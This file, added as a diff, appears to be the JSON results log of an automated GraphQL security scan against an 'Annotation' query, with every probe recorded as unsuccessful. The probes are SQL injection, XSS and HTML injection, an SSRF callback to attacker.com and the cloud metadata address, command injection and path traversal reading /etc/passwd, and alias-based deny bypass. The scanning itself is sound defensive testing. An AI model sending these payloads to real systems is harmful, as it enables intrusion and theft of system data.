@@ -1,0 +1,3498 @@
+[
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_123\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T08:13:49.806999Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_123' OR '1'='1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T08:13:51.569636Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"<script>alert('XSS')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.102,
+    "timestamp": "2025-09-29T08:13:53.691918Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"http://attacker.com/ssrf_callback?id=payload\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.124,
+    "timestamp": "2025-09-29T08:13:55.351418Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"; cat /etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.105,
+    "timestamp": "2025-09-29T08:13:57.401703Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"../../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.154,
+    "timestamp": "2025-09-29T08:14:00.192420Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"<h1>HTML Injection</h1>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.131,
+    "timestamp": "2025-09-29T08:14:02.363302Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_456\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.099,
+        "timestamp": "2025-09-29T08:14:05.068548Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.113,
+        "timestamp": "2025-09-29T08:14:05.181766Z",
+        "response_body": {
+          "data": {
+            "a": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-09-29T08:14:05.181805Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.097,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery AnnotationAlias {\n  a: Annotation(id: \"annotation_789\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.079,
+        "timestamp": "2025-09-29T08:14:07.554182Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.093,
+        "timestamp": "2025-09-29T08:14:07.647935Z",
+        "response_body": {
+          "data": {
+            "a": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-09-29T08:14:07.647999Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.096,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  Annotation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T08:14:10.388483Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/types]) : Field 'types' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_101\") {\n    ids\n    typ\n    bodt\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T08:14:12.024383Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/ids]) : Field 'ids' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typ]) : Field 'typ' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/bodt]) : Field 'bodt' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"anno_001\") {\n    id\n    type\n    body\n    field\n    by\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.092,
+    "timestamp": "2025-09-29T08:14:32.908919Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"1' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T08:14:35.067147Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_xss\", body: \"<script>alert('XSS')</script>\") {\n    id\n    body\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.095,
+    "timestamp": "2025-09-29T08:14:37.825639Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'body'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 36
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_ssrf\", field: \"http://169.254.169.254/latest/meta-data/\") {\n    id\n    field\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.095,
+    "timestamp": "2025-09-29T08:14:39.901405Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'field'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 37
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_cmd\", field: \"; cat /etc/passwd\") {\n    id\n    field\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.107,
+    "timestamp": "2025-09-29T08:14:42.849606Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'field'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 36
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_path\", field: \"../../../etc/passwd\") {\n    id\n    field\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T08:14:44.732417Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'field'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 37
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_html\", body: \"<h1>Important Notice</h1><p>Please read this carefully.</p>\") {\n    id\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T08:14:47.679653Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'body'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 37
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"bypass_test_normal\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.201,
+        "timestamp": "2025-09-29T08:14:50.022109Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.172,
+        "timestamp": "2025-09-29T08:14:50.194366Z",
+        "response_body": {
+          "data": {
+            "myAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-09-29T08:14:50.194414Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.101,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  myAnnotation: Annotation(id: \"bypass_test_aliased\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.095,
+        "timestamp": "2025-09-29T08:14:53.038800Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.097,
+        "timestamp": "2025-09-29T08:14:53.135802Z",
+        "response_body": {
+          "data": {
+            "myAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-09-29T08:14:53.135851Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.103,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"introspection_test\") {\n    id\n    __typename\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.096,
+    "timestamp": "2025-09-29T08:14:55.726840Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"field_suggest_test\") {\n    id\n    typ\n    bod\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T08:14:58.560702Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typ]) : Field 'typ' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/bod]) : Field 'bod' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_123\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.109,
+    "timestamp": "2025-09-29T08:15:17.655766Z",
+    "count": 23,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_sql' OR '1'='1\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.117,
+    "timestamp": "2025-09-29T08:15:19.525993Z",
+    "count": 24,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_xss<script>alert('XSS')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.106,
+    "timestamp": "2025-09-29T08:15:21.825323Z",
+    "count": 25,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_ssrf_http://169.254.169.254/latest/meta-data/\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T08:15:24.308426Z",
+    "count": 26,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_cmd; cat /etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.099,
+    "timestamp": "2025-09-29T08:15:26.234343Z",
+    "count": 27,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_path_../../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.084,
+    "timestamp": "2025-09-29T08:15:29.055121Z",
+    "count": 28,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_html_<h1>Important Notice</h1><p>Please read this carefully.</p>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.09,
+    "timestamp": "2025-09-29T08:15:30.781891Z",
+    "count": 29,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery AnnotationQuery {\n  Annotation(id: \"annotation_deny_bypass_non_aliased\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.087,
+        "timestamp": "2025-09-29T08:15:32.458932Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T08:15:32.553370Z",
+        "response_body": {
+          "data": {
+            "a": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 30,
+    "timestamp": "2025-09-29T08:15:32.553397Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.107,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  a: Annotation(id: \"annotation_deny_bypass_aliased\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.098,
+        "timestamp": "2025-09-29T08:15:34.875247Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.094,
+        "timestamp": "2025-09-29T08:15:34.970181Z",
+        "response_body": {
+          "data": {
+            "a": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 31,
+    "timestamp": "2025-09-29T08:15:34.970370Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.11,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T08:15:37.604857Z",
+    "count": 32,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/types]) : Field 'types' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"suggestion_test\") {\n    id\n    descrption\n    titl\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.107,
+    "timestamp": "2025-09-29T08:15:39.488555Z",
+    "count": 33,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/descrption]) : Field 'descrption' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/titl]) : Field 'titl' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_123\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T08:16:02.547826Z",
+    "count": 34,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_sql' OR '1'='1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.091,
+    "timestamp": "2025-09-29T08:16:05.282628Z",
+    "count": 35,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_xss_id\", body: \"<script>alert('XSS')</script>\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T08:16:07.455636Z",
+    "count": 36,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'body'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 39
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_ssrf_id\", annotationType: \"http://169.254.169.254/latest/meta-data/\") {\n    id\n    annotationType\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.102,
+    "timestamp": "2025-09-29T08:16:09.415592Z",
+    "count": 37,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'annotationType'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_cmd_id\", field: \"; cat /etc/passwd\") {\n    id\n    field\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.099,
+    "timestamp": "2025-09-29T08:16:12.385664Z",
+    "count": 38,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'field'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 39
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_path_id\", field: \"../../../../../etc/passwd\") {\n    id\n    field\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.095,
+    "timestamp": "2025-09-29T08:16:14.864293Z",
+    "count": 39,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'field'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_html_id\", body: \"<h1>Important Notice</h1><p>Please <img src='x' onerror='alert(\\\"XSS\\\")'> read this carefully.</p>\") {\n    id\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.101,
+    "timestamp": "2025-09-29T08:16:17.947712Z",
+    "count": 40,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (UnknownArgument@[Annotation]) : Unknown field argument 'body'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 40
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_bypass_non_aliased\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.087,
+        "timestamp": "2025-09-29T08:16:20.200503Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.096,
+        "timestamp": "2025-09-29T08:16:20.297040Z",
+        "response_body": {
+          "data": {
+            "aliasedAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 41,
+    "timestamp": "2025-09-29T08:16:20.297078Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.134,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
